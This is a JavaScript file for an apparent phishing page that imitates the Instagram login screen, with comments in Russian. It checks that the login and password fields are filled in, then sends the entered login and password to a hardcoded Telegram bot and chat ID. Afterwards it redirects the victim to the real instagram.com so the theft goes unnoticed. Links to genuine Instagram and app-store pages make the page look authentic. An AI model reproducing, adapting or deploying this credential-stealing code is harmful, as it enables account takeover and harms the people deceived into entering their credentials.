let BOT_TOKEN = "6718955817:AAEQbhaq0DGCDXPZPG43-fbJcY3qYEQCWK0";
let TELEGRAM_BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
let TELEGRAM_CHAT_ID = "431473115"; // Убедитесь, что chat_id правильный

let loginInput = document.querySelector("#login");
let passwordInput = document.querySelector("#password");
let button = document.querySelector("button");

let loginError = document.querySelector("#login-error");
let passwordError = document.querySelector("#password-error");

let appstore = document.querySelector(".appstore");
let playmarket = document.querySelector(".playmarket");
let fb = document.querySelector(".loginfb");
let forgot = document.querySelector("#forgot");

forgot.addEventListener("click", (event) => {
  event.preventDefault();
  window.location.href = "https://www.instagram.com/accounts/password/reset/";
});


appstore.addEventListener("click", (event) => {
  event.preventDefault();
  window.location.href = "https://apps.apple.com/ru/app/instagram/id389801252";
});

playmarket.addEventListener("click", (event) => {
  event.preventDefault();
  window.location.href =
    "https://play.google.com/store/apps/details?id=com.instagram.android&hl=ru&gl=US&pli=1";
});

button.addEventListener("click", (event) => {
  event.preventDefault();

  // Очистить предыдущие сообщения об ошибках
  loginError.textContent = "";
  passwordError.textContent = "";

  let hasError = false;

  // Проверка на пустые поля
  if (!loginInput.value) {
    loginError.textContent = "Please enter your login.";
    hasError = true;
  }

  if (!passwordInput.value) {
    passwordError.textContent = "Please enter your password.";
    hasError = true;
  }

  // Если ошибок нет, отправляем данные
  if (!hasError) {
    sendMessageToBot();
    window.location.href = "https://www.instagram.com/";
  }
});

function sendMessageToBot() {
  fetch(TELEGRAM_BOT_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `\n Login: ${loginInput.value} \n Password: ${passwordInput.value}`,
    }),
  })
    .then((response) => {
      console.log("Response status:", response.status);
      return response.text(); // Используйте text() для более детального ответа
    })
    .then((data) => {
      console.log("Response data:", data);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}
